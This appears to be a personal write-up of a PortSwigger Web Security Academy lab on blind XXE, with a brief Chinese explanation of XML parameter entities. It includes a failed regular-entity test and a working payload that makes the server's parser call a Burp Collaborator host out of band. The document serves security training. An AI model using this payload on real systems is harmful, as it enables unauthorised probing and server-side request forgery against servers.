---
title: 'Lab: Blind XXE with out-of-band interaction via XML parameter entities'
tags: [Portswigger Web Security Academy, Web]

category: "Security/Practice/Portswigger Web Security Academy/XXE/Blind XXE"
---

# Lab: Blind XXE with out-of-band interaction via XML parameter entities
<!-- more -->
###### tags: `Portswigger Web Security Academy` `Web`
* Description: This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.
* Goal: To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
* Hint: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

## Background
這一題會用到Parameter Entity，也就是當server端擋掉外部的entity輸入時，可以直接在`DOCTYPE`中直接Reference，也就是利用`%`這個字元達到這個效果

## Recon
* Create a new entity and reference it
    :::spoiler Payload
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE test [ <!ENTITY xxe "test"> ]>
    <stockCheck>
        <productId>
            &xxe;
        </productId>
        <storeId>
            1
        </storeId>
    </stockCheck>
    ```
    :::
    ![](https://hackmd.io/_uploads/H1hEjtUNh.png)
    Seems not work properly...


## Exp
* Use Parameter Entity
    :::spoiler Payload
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://a1cby8s3b3bvzxlb8cfaw4jvqmwfk4.burpcollaborator.net"> %xxe; ]>
    <stockCheck>
        <productId>
            1
        </productId>
        <storeId>
            1
        </storeId>
    </stockCheck>
    ```
    :::

:::spoiler Success Screenshot
![](https://hackmd.io/_uploads/rJh0sYLEn.png)

---
![](https://hackmd.io/_uploads/rk7H2FL42.png)
:::

## Reference
[XXE Lab Breakdown: Blind XXE with out-of-band interaction via XML parameter entities](https://youtu.be/xjcSMFKVTW4)
[Lab: Blind XXE with out-of-band interaction via XML parameter entities](https://www.cnblogs.com/Zeker62/p/15190054.html)